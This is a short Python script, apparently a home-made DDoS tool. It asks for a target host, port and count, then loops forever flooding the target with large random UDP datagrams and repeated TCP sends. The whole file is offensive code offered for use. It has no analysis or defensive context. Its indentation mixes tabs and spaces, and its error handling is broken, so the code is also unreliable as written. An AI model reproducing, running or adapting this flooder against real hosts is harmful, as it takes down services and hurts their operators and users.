#import
import random
import socket
import threading
import time
from time import sleep
#Note Ddos
ip = str(input("\033[96mHost/Ip:\033[0m"))
port = int(input("\033[91mPort:\033[0m"))
times = int(input("\033[94mTime:\033[0m"))
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65500)
#############
def run():
	data = random._urandom(65500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			for x in range(times):
	                 s.send(data)
			print("\033[92mConnection\033[0m")
		except:
			print("\033[31mNo connection!\033[0m")
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
            sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(bytes, (ip,port))
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
#Run UPD DDOS
run()